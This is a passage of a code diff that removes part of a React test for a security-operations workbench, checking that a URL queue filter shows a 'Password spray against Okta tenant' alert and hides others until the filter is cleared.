-      return jsonResponse({ pending: 2, high: 1, medium: 1 });
-    }
-
-    return defaultFetchImplementation(url, options);
-  });
-
-  renderWithProviders(<SOCWorkbench />, '/soc?queueFilter=password#queue');
-
-  expect(await screen.findByDisplayValue('password')).toBeInTheDocument();
-  expect(await screen.findByText('Password spray against Okta tenant')).toBeInTheDocument();
-  expect(screen.queryByText('Container drift detected on node-7')).not.toBeInTheDocument();
-  expect(
-    await screen.findByText(/This queue filter is mirrored into the URL/i),
-  ).toBeInTheDocument();
-
-  fireEvent.click(screen.getByRole('button', { name: 'Clear Filter' }));
-
-  expect(await screen.findByText('Container drift detected on node-7')).toBeInTheDocument();
 });
